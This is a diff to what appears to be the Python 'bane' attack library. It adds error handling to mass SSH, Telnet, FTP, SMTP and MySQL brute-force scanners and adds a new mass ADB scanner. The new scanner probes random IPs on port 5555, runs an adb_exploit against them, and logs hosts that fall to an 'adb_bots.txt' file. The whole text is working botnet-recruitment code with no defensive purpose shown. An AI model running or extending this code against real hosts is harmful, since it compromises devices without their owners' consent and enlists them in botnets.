@@ -1,5 +1,6 @@
 import os,sys,socket,random,time,threading,smtplib,telnetlib
 from bane.payloads import *
+from bane.vulns import adb_exploit
 from ftplib import FTP
 linux=True
 if os.path.isdir('/data/data')==True:
@@ -78,8 +79,11 @@ def mass_ssh(threads=100,wl=wordlist,filename='ssh_bots.txt'):
  wordlist=wl
  thr=[]
  for x in range(threads):
-  t=iots().start()
-  thr.append(t)
+  try:
+   t=iots().start()
+   thr.append(t)
+  except:
+   pass
  while True:
   try:
     time.sleep(.1)
@@ -119,8 +123,11 @@ def mass_telnet(threads=500,wl=wordlist,filename='telnet_bots.txt'):
  wordlist=wl
  thr=[]
  for x in range(threads):
-  t=iott().start()
-  thr.append(t)
+  try:
+   t=iott().start()
+   thr.append(t)
+  except:
+   pass
  while True:
   try:
     time.sleep(.1)
@@ -159,8 +166,11 @@ def mass_ftp(threads=100,meth=1,wl=wordlist,filename='ftp_bots.txt'):
  wordlist=wl
  thr=[]
  for x in range(threads):
-  t=iotf1().start()
-  thr.append(t)
+  try:
+   t=iotf1().start()
+   thr.append(t)
+  except:
+   pass
  while True:
   try:
     time.sleep(.1)
@@ -193,8 +203,11 @@ def mass_ftp_anon(threads=100,filename='ftp_anon_bots.txt'):
  filen=filename
  thr=[]
  for x in range(threads):
-  t=iotf2().start()
-  thr.append(t)
+  try:
+   t=iotf2().start()
+   thr.append(t)
+  except:
+   pass
  while True:
   try:
     time.sleep(.1)
@@ -235,8 +248,11 @@ def mass_smtp(o,threads=100,wl=wordlist,filename='smtp_bots.txt'):
  wordlist=wl
  thr=[]
  for x in range(threads):
-  t=iotsm().start()
-  thr.append(t)
+  try:
+   t=iotsm().start()
+   thr.append(t)
+  except:
+   pass
  while True:
   try:
     time.sleep(.1)
@@ -275,8 +291,11 @@ def mass_mysql(threads=100,wl=wordlist,filename='mysql_bots.txt'):
  wordlist=wl
  thr=[]
  for x in range(threads):
-  t=iotmy().start()
-  thr.append(t)
+  try:
+   t=iotmy().start()
+   thr.append(t)
+  except:
+   pass
  while True:
   try:
     time.sleep(.1)
@@ -313,8 +332,58 @@ def mass_mysql_default(threads=100,wl=wordlist,filename='mysql_default_bots.txt'
  wordlist=wl
  thr=[]
  for x in range(threads):
-  t=iotmy2().start()
-  thr.append(t)
+  try:
+   t=iotmy2().start()
+   thr.append(t)
+  except:
+   pass
+ while True:
+  try:
+    time.sleep(.1)
+  except KeyboardInterrupt:
+    break
+ for x in thr:
+     del x
+
+
+
+
+
+
+class iotadb(threading.Thread):
+ def run(self):
+  while True:
+   ip=getip()
+   i=False
+   try:
+    so=socket.socket()
+    so.settimeout(3)
+    so.connect((ip,5555))
+    i=True
+   except Exception as ex: 
+    pass
+   if i==True:
+    for x in wordlist:
+     try:
+      q=adb_exploit(ip)
+      if q==True:
+       print (ip)
+       write_file(ip,filen)
+     except Exception as e: 
+      pass
+def mass_adb(threads=100,wl=wordlist,filename='adb_bots.txt'):
+ create_file(filename)
+ global filen
+ filen=filename
+ global wordlist
+ wordlist=wl
+ thr=[]
+ for x in range(threads):
+  try:
+   t=iotadb().start()
+   thr.append(t)
+  except:
+   pass
  while True:
   try:
     time.sleep(.1)
